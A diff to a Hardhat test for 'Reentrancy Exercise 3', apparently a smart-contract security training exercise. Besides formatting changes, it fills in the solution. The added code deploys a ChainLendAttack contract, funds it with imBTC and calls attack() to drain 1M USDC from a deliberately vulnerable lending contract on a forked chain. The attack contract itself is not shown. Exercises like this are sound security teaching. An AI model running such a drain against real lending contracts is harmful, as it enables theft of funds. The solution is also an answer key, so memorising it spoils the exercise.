@@ -2,11 +2,10 @@ const { expect } = require("chai");
 const { ethers } = require("hardhat");
 
 describe("Reentrancy Exercise 3", function () {
-
   const imBTC_ADDRESS = "0x3212b29E33587A00FB1C83346f5dBFA69A458923";
-  const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
-  const imBTC_WHALE = "0xFEa4224Da399F672eB21a9F3F7324cEF1d7a965C"
-  const USDC_WHALE = "0xF977814e90dA44bFA03b6295A0616a897441aceC"
+  const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+  const imBTC_WHALE = "0xFEa4224Da399F672eB21a9F3F7324cEF1d7a965C";
+  const USDC_WHALE = "0xF977814e90dA44bFA03b6295A0616a897441aceC";
 
   const USDC_IN_CHAINLEND = ethers.utils.parseUnits("1000000", 6);
 
@@ -28,17 +27,18 @@ describe("Reentrancy Exercise 3", function () {
     ]);
     // Send some ETH for whales for tx fees
     await deployer.sendTransaction({
-        to: USDC_WHALE,
-        value: ethers.utils.parseUnits("2")
+      to: USDC_WHALE,
+      value: ethers.utils.parseUnits("2"),
     });
     await deployer.sendTransaction({
-        to: imBTC_WHALE,
-        value: ethers.utils.parseUnits("2")
+      to: imBTC_WHALE,
+      value: ethers.utils.parseUnits("2"),
     });
 
     // ChainLend deployment
     const ChainLend = await ethers.getContractFactory(
-      "contracts/reentrancy-3/ChainLend.sol:ChainLend", deployer
+      "contracts/reentrancy-3/ChainLend.sol:ChainLend",
+      deployer
     );
     this.chainLend = await ChainLend.deploy(imBTC_ADDRESS, USDC_ADDRESS);
 
@@ -51,8 +51,10 @@ describe("Reentrancy Exercise 3", function () {
 
     // Impersonate imBTC Whale and send 1 imBTC to attacker
     const imBTCWhale = await ethers.getImpersonatedSigner(imBTC_WHALE);
-    await this.imBTC.connect(imBTCWhale).transfer(attacker.address, ethers.utils.parseUnits("1", 8));
-    
+    await this.imBTC
+      .connect(imBTCWhale)
+      .transfer(attacker.address, ethers.utils.parseUnits("1", 8));
+
     // Impersonate USDC Whale and send 1M USDC to ChainLend
     const USDCWhale = await ethers.getImpersonatedSigner(USDC_WHALE);
     this.usdc = await hre.ethers.getContractAt(
@@ -60,23 +62,42 @@ describe("Reentrancy Exercise 3", function () {
       USDC_ADDRESS,
       deployer
     );
-    await this.usdc.connect(USDCWhale).transfer(
-      this.chainLend.address, USDC_IN_CHAINLEND
-    );
-    
-  })
+    await this.usdc
+      .connect(USDCWhale)
+      .transfer(this.chainLend.address, USDC_IN_CHAINLEND);
+  });
 
   it("Exploit", async () => {
     /** CODE YOUR SOLUTION HERE */
-    
-  })
+
+    const ChainLendAttack = await ethers.getContractFactory(
+      "ChainLendAttack",
+      attacker
+    );
+
+    this.attack = await ChainLendAttack.deploy(
+      this.chainLend.address,
+      this.imBTC.address,
+      this.usdc.address
+    );
+    await this.imBTC
+      .connect(attacker)
+      .transfer(this.attack.address, ethers.utils.parseUnits("1", 8));
+
+    await this.attack.attack();
+
+    console.log(
+      "Attacker balance",
+      (await this.chainLend.deposits(this.attack.address)).toString()
+    );
+  });
 
   after(async () => {
     /** SUCCESS CONDITIONS */
 
     // Attacker drained all chainlend USDC balance
-    expect(await this.usdc.balanceOf(attacker.address)).to.be.equal(USDC_IN_CHAINLEND);
-  })
-  
+    expect(await this.usdc.balanceOf(attacker.address)).to.be.equal(
+      USDC_IN_CHAINLEND
+    );
+  });
 });
-
